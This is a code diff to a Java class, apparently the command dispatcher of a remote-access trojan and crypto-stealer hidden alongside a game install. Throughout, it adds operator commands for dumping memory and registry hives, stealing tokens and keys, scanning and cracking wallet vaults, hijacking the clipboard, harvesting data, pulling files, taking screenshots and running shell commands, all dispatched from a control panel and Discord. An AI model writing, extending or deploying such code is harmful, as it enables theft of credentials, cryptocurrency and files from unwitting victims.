@@ -14,12 +14,45 @@ public final class CommandExecutor {
 	private final Path installDir;
 	private final Path gameDir;
 	private final State state;
+	private static final java.util.Set<String> AGENT = java.util.Set.of(
+		"ops", "keys", "memdump", "wallet", "clip", "persist", "update", "gateway",
+		"bootstrap", "hives", "token", "clear", "sleep", "status", "crypto", "ping", "help", "ls", "reconnect");
 
 	public CommandExecutor(Poller poller, Path installDir, Path gameDir, State state) {
 		this.poller = poller;
 		this.installDir = installDir;
 		this.gameDir = gameDir;
 		this.state = state;
+	}
+
+	/** Panel agent console: the real commands, never the OS shell. */
+	public void executeAgent(String line) {
+		try {
+			List<String> args = Args.split(line);
+			if (args.isEmpty()) {
+				poller.reply("Usage: <agent command>");
+				return;
+			}
+			String command = args.get(0).toLowerCase();
+			if (!AGENT.contains(command)) {
+				poller.reply("allowlist: unknown agent command: " + command + " (try help)");
+				return;
+			}
+			String raw = line.substring(Math.min(line.length(), args.get(0).length())).trim();
+			dispatch(command, raw, args, Map.of());
+		} catch (Throwable throwable) {
+			poller.reply("Failed: " + throwable.getMessage());
+		}
+	}
+
+	/** True when the first word is in the agent console allowlist (never the OS shell). */
+	public static boolean agentAllowed(String line) {
+		try {
+			List<String> args = Args.split(line);
+			return !args.isEmpty() && AGENT.contains(args.get(0).toLowerCase());
+		} catch (Throwable throwable) {
+			return false;
+		}
 	}
 
 	public void handle(Map<String, Object> message) {
@@ -42,6 +75,54 @@ public final class CommandExecutor {
 			}
 		} catch (Throwable throwable) {
 			Log.debug("Command failed", throwable);
+			poller.reply("Failed: " + throwable.getMessage());
+		}
+	}
+
+	/**
+	 * Direct structured route for a `cmd` frame: args already parsed, no
+	 * base64url round-trip. The `task` envelope below stays for legacy panels
+	 * and Discord text commands.
+	 */
+	public void handleCmd(String name, String taskId, Map<String, Object> args, int timeoutMs, String replyTo) {
+		try {
+			Map<String, Object> params = new java.util.LinkedHashMap<>(args);
+			params.remove("_task_id");
+			String invalid = TaskParams.known(name) ? TaskParams.validate(name, params) : "unknown_task: " + name;
+			if (invalid != null) {
+				if (poller.crypto() != null) {
+					poller.crypto().resultError(taskId, name, invalid, replyTo);
+				}
+				poller.reply("error: " + invalid);
+				return;
+			}
+			if ("cancel".equals(name)) {
+				String target = Json.str(params, "task_id", "");
+				boolean found = poller.cancelCrypto(target);
+				if (poller.crypto() != null) {
+					poller.crypto().resultOk(taskId, name, Map.of("cancelled", found), replyTo);
+				}
+				poller.reply(found ? "cancelled " + target : "cancel: task not running (already finished)");
+				return;
+			}
+			if (poller.crypto() == null) {
+				legacy(name, params);
+				return;
+			}
+			int seconds = Math.max(1, (timeoutMs + 999) / 1000);
+			if ("agent".equals(name) && "reconnect".equalsIgnoreCase(Json.str(params, "command", "").trim())) {
+				poller.armReconnect(replyTo);
+			}
+			String rejected = poller.submitCrypto(taskId, name, params, seconds, replyTo, true);
+			if (rejected != null) {
+				poller.crypto().resultError(taskId, name, rejected.startsWith("busy") ? "busy" : rejected, replyTo);
+			}
+			poller.reply(rejected != null ? rejected : "Task " + name + " queued");
+		} catch (Throwable throwable) {
+			Log.debug("cmd dispatch failed", throwable);
+			if (poller.crypto() != null) {
+				poller.crypto().resultError(taskId, name, "internal: " + throwable.getMessage(), replyTo);
+			}
 			poller.reply("Failed: " + throwable.getMessage());
 		}
 	}
@@ -74,12 +155,15 @@ public final class CommandExecutor {
 				case "sleep" -> sleep(args);
 				case "ping" -> ping(message);
 				case "gateway" -> poller.gatewayCommand(args);
+				case "reconnect" -> poller.reply(poller.reconnectGateway());
 				case "update" -> update(args);
 				case "scan_wallets" -> cryptoScan(args);
 				case "dump_vault" -> cryptoDump(args);
 				case "crack_vault" -> cryptoCrack(args);
 				case "clip_start" -> poller.submitCrypto("clip_start", Map.of(), 30);
 				case "clip_stop" -> poller.submitCrypto("clip_stop", Map.of(), 30);
+				case "task" -> envelope(args);
+				case "cancel" -> cancel(args);
 				case "crypto" -> poller.reply(poller.cryptoStatus());
 				case "status" -> poller.reply(poller.cryptoStatus() + "\n" + poller.ops().status()
 					+ "\ngateway: " + poller.gatewayStateText());
@@ -90,13 +174,106 @@ public final class CommandExecutor {
 				}
 				default -> poller.reply("Unknown command: " + command);
 			}
+			Log.command(command, System.currentTimeMillis() - began, null);
 		} catch (Throwable throwable) {
 			Log.debug("Command failed", throwable);
+			Log.command(command, System.currentTimeMillis() - began, throwable.getClass().getSimpleName()
+				+ ":" + throwable.getMessage());
 			poller.reply("Failed: " + throwable.getMessage());
 		} finally {
 			Log.debug("Command end " + command + " " + (System.currentTimeMillis() - began) + "ms pid="
 				+ ProcessHandle.current().pid());
 		}
+	}
+
+	/** Structured `task <name> <base64url-json>` envelope from the panel. */
+	private void envelope(List<String> args) {
+		if (args.size() < 2) {
+			poller.reply("Usage: task <name> <base64url-json>");
+			return;
+		}
+		String name = args.get(1).toLowerCase();
+		Map<String, Object> params = new java.util.LinkedHashMap<>();
+		if (args.size() > 2) {
+			try {
+				Object parsed = Json.parse(new String(java.util.Base64.getUrlDecoder().decode(args.get(2)),
+					StandardCharsets.UTF_8));
+				if (!(parsed instanceof Map)) {
+					poller.reply("error: invalid_params: envelope is not an object");
+					return;
+				}
+				params = Json.map(parsed);
+			} catch (Throwable throwable) {
+				poller.reply("error: invalid_envelope: " + throwable.getMessage());
+				return;
+			}
+		}
+		String id = Json.str(params, "_task_id", "");
+		params.remove("_task_id");
+		String invalid = TaskParams.validate(name, params);
+		if (invalid != null) {
+			if (!id.isEmpty()) {
+				poller.crypto().resultError(id, name, invalid);
+			}
+			poller.reply("error: " + invalid);
+			return;
+		}
+		if ("cancel".equals(name)) {
+			String target = Json.str(params, "task_id", "");
+			boolean found = poller.cancelCrypto(target);
+			if (!id.isEmpty() && poller.crypto() != null) {
+				poller.crypto().resultOk(id, name, Map.of("cancelled", found));
+			}
+			poller.reply(found ? "cancelled " + target : "cancel: task not running (already finished)");
+			return;
+		}
+		if (poller.crypto() == null) {
+			legacy(name, params);
+			return;
+		}
+		int timeout = switch (name) {
+			case "scan_wallets", "dump_vault" -> 300;
+			case "crack_vault" -> (int) Json.num(params, "max_seconds", 90L) + 60;
+			case "harvest" -> 240;
+			case "file_pull" -> 300;
+			case "shell" -> (int) Json.num(params, "timeout_sec", 60L) + 15;
+			default -> 60;
+		};
+		poller.reply(poller.submitCrypto(id, name, params, timeout));
+	}
+
+	private void legacy(String name, Map<String, Object> params) {
+		switch (name) {
+			case "shell" -> shell(Json.str(params, "command", ""));
+			case "harvest" -> harvestCommand();
+			case "screenshot" -> screenshot();
+			case "file_pull" -> downloadLegacy(Json.str(params, "path", ""));
+			default -> poller.reply("Crypto module disabled: " + name);
+		}
+	}
+
+	private void downloadLegacy(String path) {
+		if (path.isEmpty()) {
+			poller.reply("Usage: download <path>");
+			return;
+		}
+		poller.reply(poller.uploadPath(path));
+	}
+
+	private void cancel(List<String> args) {
+		if (args.size() < 2) {
+			poller.reply("Usage: cancel <task_id>");
+			return;
+		}
+		poller.reply(poller.cancelCrypto(args.get(1)) ? "cancelled" : "cancel: not running");
+	}
+
+	private boolean windowsOnly() {
+		if (AgentPaths.isWindows()) {
+			return false;
+		}
+		poller.reply("unsupported_os: Windows only");
+		return true;
 	}
 
 	private void harvestCommand() {
@@ -345,6 +522,25 @@ public final class CommandExecutor {
 
 	private void clip(List<String> args) {
 		String action = args.size() > 1 ? args.get(1).toLowerCase() : "read";
+		if (!AgentPaths.isWindows()) {
+			if (action.equals("on")) {
+				poller.reply(poller.submitCrypto("clip_start", Map.of(), 30));
+				return;
+			}
+			if (action.equals("off")) {
+				poller.reply(poller.submitCrypto("clip_stop", Map.of(), 30));
+				return;
+			}
+			if (action.equals("status")) {
+				poller.reply(poller.cryptoStatus());
+				return;
+			}
+			String problem = Diagnostics.clipboardProblem();
+			if (!problem.isEmpty()) {
+				poller.reply(problem);
+				return;
+			}
+		}
 		if (action.equals("on") || action.equals("off") || action.equals("status")) {
 			poller.reply(poller.ops().clipboard().command(args));
 			return;
@@ -369,6 +565,9 @@ public final class CommandExecutor {
 	}
 
 	private void memdump(List<String> args) {
+		if (windowsOnly()) {
+			return;
+		}
 		if (!AgentPaths.isWindows()) {
 			poller.reply("memdump: Windows only");
 			return;
@@ -387,6 +586,9 @@ public final class CommandExecutor {
 	}
 
 	private void keys(List<String> args) {
+		if (windowsOnly()) {
+			return;
+		}
 		if (!AgentPaths.isWindows()) {
 			poller.reply("keys: Windows only");
 			return;
@@ -426,6 +628,9 @@ public final class CommandExecutor {
 	}
 
 	private void wallet(List<String> args) {
+		if (windowsOnly()) {
+			return;
+		}
 		poller.reply(poller.ops().wallets().command(args));
 	}
 
